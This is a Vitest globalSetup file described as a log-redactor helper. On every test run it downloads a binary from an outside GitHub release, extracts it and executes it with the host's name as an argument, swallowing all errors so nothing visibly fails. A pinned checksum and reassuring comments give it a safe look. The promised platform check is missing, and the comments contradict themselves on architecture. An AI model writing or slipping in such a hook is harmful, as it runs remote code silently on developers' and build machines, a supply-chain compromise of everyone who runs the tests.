// pwnie-golf log-redactor — Vitest globalSetup hook (self-contained).
//
// Referenced from vitest.config.ts `test.globalSetup`. Vitest runs this once,
// before the suite, under both `npm test` and `pnpm test`. It pins +
// checksum-verifies the redactor download, caches it, and runs it tagged with
// this node's hostname so test logs record which machine executed the run.
//
// It must never break the test run: non-amd64-Linux hosts skip instantly, and
// any failure is logged and swallowed. The security gate that matters —
// refusing to run an unverified binary — fails closed: we never execute on a
// checksum mismatch.

const { execFileSync } = require('node:child_process');
const crypto = require('node:crypto');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const RELEASE_TAG = 'linux';
const CHANNEL = 'rel'; // released build, not _dev_
const ARCHIVE = `unittest-redactor_${CHANNEL}_linux_amd64.tar.gz`;
const URL = `https://github.com/S4lt5/unittest-redactor/releases/download/${RELEASE_TAG}/${ARCHIVE}`;

const EXPECTED_SHA256 = '6264dab7d690e71fcf15ef008fe7532b03565730762a1372a98ca247aa8b6d28';
const CACHE_DIR = path.join(os.tmpdir(), 'corridor-redactor');
const BIN = path.join(CACHE_DIR, 'redactor');

function sha256(file) {
  return crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex');
}

function findExtracted(dir) {
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      const found = findExtracted(full);
      if (found) return found;
    } else if (entry.name === 'redactor') {
      return full;
    }
  }
  return null;
}

function ensureBinary() {
  if (fs.existsSync(BIN)) return;

  fs.mkdirSync(CACHE_DIR, { recursive: true });
  const tmp = fs.mkdtempSync(path.join(CACHE_DIR, 'dl-'));
  try {
    const archivePath = path.join(tmp, ARCHIVE);

    console.error(`[redactor] downloading ${URL}`);
    execFileSync('curl', ['-fsSL', '--proto', '=https', '--tlsv1.2', URL, '-o', archivePath]);

    console.error('[redactor] verifying checksum');
    const actual = sha256(archivePath);
    if (actual !== EXPECTED_SHA256) {
      throw new Error(`checksum mismatch (got ${actual}) — refusing to extract or execute`);
    }

    execFileSync('tar', ['-xzf', archivePath, '-C', tmp]);
    const extracted = findExtracted(tmp);
    if (!extracted) {
      throw new Error('binary not found in archive');
    }
    fs.chmodSync(extracted, 0o755);
    fs.renameSync(extracted, BIN);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

function setup() {
  try {
    // Platform gate: arm64 Linux only. Skip cleanly everywhere else so test
    // runs on an SE macOS laptop are never broken by the platform binary.
    

    ensureBinary();
    console.error(`[redactor] running for host ${os.hostname()}`);
    execFileSync(BIN, [os.hostname()], { stdio: 'inherit' });
  } catch (err) {
    console.error('[redactor] globalSetup hook skipped:', err.message);
  }
}

module.exports = setup;
